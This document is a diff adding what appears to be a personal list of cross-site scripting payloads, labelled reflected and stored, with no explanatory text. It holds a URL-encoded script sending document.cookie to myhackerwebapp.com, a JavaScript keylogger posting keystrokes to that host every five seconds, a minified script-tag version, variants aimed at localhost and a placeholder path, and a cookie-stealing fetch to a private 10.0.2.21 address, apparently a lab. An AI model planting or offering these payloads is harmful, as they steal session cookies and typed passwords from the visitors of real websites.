@@ -1,0 +1,44 @@
+====== REFLECTED ======
+%3Cscript%3Efetch(%22http://myhackerwebapp.com/?%22%20%2B%20document.cookie);%3C/script%3E
+
+
+====== STORED ====== 
+let keys = '';
+document.addEventListener('keydown', function(event) {
+  keys += event.key;
+});
+setInterval(function() {
+  if (keys.length > 0) {
+    const http = new XMLHttpRequest();
+    const url = 'myhackerwebapp.com';
+    const params = 'keys=' + encodeURIComponent(keys);
+    http.open('POST', url, true);
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    http.send(params);
+    keys = '';
+  }
+}, 5000);
+
+<script>let k='',x=new XMLHttpRequest();
+addEventListener('keydown',e=>k+=e.key);setInterval(()=>{k&&(x.open('POST','http://myhackerwebapp.com/',!0),x.setRequestHeader('ct','application/x-www-form-urlencoded'),x.send(encodeURIComponent(k))),k=''},5e3);</script>
+
+let keys = '';
+document.addEventListener('keydown', function(event) {
+  keys += event.key;
+});
+setInterval(function() {
+  if (keys.length > 0) {
+    const http = new XMLHttpRequest();
+    const url = '/path/to/server';
+    const params = 'keys=' + encodeURIComponent(keys);
+    http.open('POST', url, true);
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    http.send(params);
+    keys = '';
+  }
+}, 5000);
+
+<script>let k='',x=new XMLHttpRequest();
+addEventListener('keydown',e=>k+=e.key);setInterval(()=>{k&&(x.open('POST','http://localhost:8080/',!0),x.setRequestHeader('ct','application/x-www-form-urlencoded'),x.send(encodeURIComponent(k))),k=''},5e3);</script>
+
+<script>fetch("http://10.0.2.21:8080/?" + document.cookie);</script>
